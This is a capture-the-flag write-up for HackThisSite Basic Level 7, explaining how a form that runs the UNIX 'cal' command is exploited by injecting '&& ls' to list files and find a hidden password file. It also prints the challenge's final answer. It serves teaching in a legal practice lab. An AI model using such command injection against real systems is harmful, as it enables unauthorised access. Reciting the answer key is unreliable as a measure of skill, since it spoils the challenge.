# HackThisSite.org – Basic Level 7 (Command Injection)

## Challenge Information

* **CTF Name:** HackThisSite
* **Challenge Name:** Level 7
* **Category:** Web / Command Injection
* **Difficulty:** Easy–Medium (Beginner)
* **Challenge Description:**
  Network Security Sam has saved the unencrypted password in an obscurely named file in the current directory. A script is provided that returns the output of the UNIX `cal` command.

---

## TL;DR (Summary)

User input is directly passed to a system command. By injecting shell commands, the directory contents can be listed, revealing the password file.

---

## Thought Process & Approach

Inspecting the HTML shows that user input is sent to a server-side script that runs the UNIX `cal` command. Since no input validation is visible, this strongly suggests a **command injection** vulnerability.

The challenge description hints that the password file exists in the same directory, so the goal becomes listing directory contents.

---

## Analysis

Inspecting the page source reveals the following form:

```
<form action="/missions/basic/7/cal.pl" method="post">
    <input type="text" name="cal">
    <input type="submit" value="view">
</form>
```

Nothing sensitive is exposed directly in the HTML.

Re-reading the challenge description clarifies that the server executes the `cal` command using user input as an argument. If input is not sanitized, additional shell commands can be appended.

---

## Exploitation

Using shell command chaining, the following input is supplied:

```
&& ls
```

This results in the server executing:

```
cal && ls
```

The output displays the calendar followed by the directory listing:

```
index.php
level7.php
cal.pl
.
..
k1kh31b1n55h.php
```

The obscurely named file is clearly visible.

---

## Solution Steps

1. Inspect the HTML form to identify where input is sent.
2. Realize the input is passed to a shell command.
3. Inject `&& ls` to list directory contents.
4. Identify the suspicious file name.
5. Open the file directly via the browser to retrieve the password.

---

## Final Answer

```
72b70c6d
```
